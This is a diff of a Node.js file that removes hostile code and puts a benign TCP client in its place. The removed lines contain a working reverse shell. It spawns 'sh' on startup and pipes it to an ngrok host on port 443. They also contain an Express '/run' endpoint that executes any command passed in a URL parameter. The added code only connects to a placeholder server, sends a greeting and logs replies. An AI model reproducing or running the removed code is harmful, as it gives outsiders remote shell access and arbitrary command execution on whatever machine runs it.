@@ -1,51 +1,30 @@
-const express = require('express');
-const { exec } = require('child_process');
 const net = require('net');
-const cp = require('child_process');
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+// Define the server address and port
+const SERVER_IP = 'your-server-ip'; // Replace with your server's IP address
+const PORT = 12345;
 
-// Function to start the reverse shell
-function startReverseShell() {
-    const sh = cp.spawn('sh', []);
-    const client = new net.Socket();
+// Create a TCP client
+const client = new net.Socket();
 
-    client.connect(443, '5a51-140-238-85-162.ngrok-free.app', function() {
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-
-    // Prevents the Node.js application from crashing
-    return /a/;
-}
-
-// Start the reverse shell when the application starts
-startReverseShell();
-
-// Route to execute commands from URL parameter
-app.get('/run', (req, res) => {
-    const command = req.query.command;
-
-    if (!command) {
-        res.status(400).send('Missing command parameter');
-        return;
-    }
-
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            res.send(`<pre>Error: ${error.message}</pre>`);
-            return;
-        }
-        if (stderr) {
-            res.send(`<pre>stderr: ${stderr}</pre>`);
-            return;
-        }
-        res.send(`<pre>${stdout}</pre>`);
-    });
+client.connect(PORT, SERVER_IP, () => {
+    console.log('Connected to server');
+    client.write('Hello from the remote machine!');
 });
 
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+// Handle incoming data from the server
+client.on('data', (data) => {
+    console.log('Received from server:', data.toString());
+    // Optional: close the connection after receiving data
+    // client.destroy();
+});
+
+// Handle connection closure
+client.on('close', () => {
+    console.log('Connection closed');
+});
+
+// Handle errors
+client.on('error', (err) => {
+    console.error('Error:', err.message);
 });
